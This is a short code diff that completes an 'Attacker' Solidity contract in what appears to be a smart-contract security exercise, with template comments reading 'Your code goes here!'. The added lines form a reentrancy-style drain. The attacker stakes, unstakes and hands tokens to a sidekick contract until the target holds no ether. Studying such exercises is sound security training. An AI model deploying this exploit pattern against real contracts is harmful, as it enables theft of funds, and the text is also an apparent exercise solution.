@@ -33,13 +33,22 @@ contract Attacker {
 	}
 
     receive() external payable {
-        
+        token.transfer(address(sidekick), token.balanceOf(address(this)));
         /*
             Your code goes here!
         */
     }
 
     function exploit() public payable {
+        if(address(target).balance > 0){
+            if(token.balanceOf(address(this)) == 0) {
+                target.stake{value: 1 ether}();
+            }
+            target.unstake();
+        }
+        if(address(target).balance > 0){
+            sidekick.exploit();
+        }
         /*
             Your code goes here!
         */
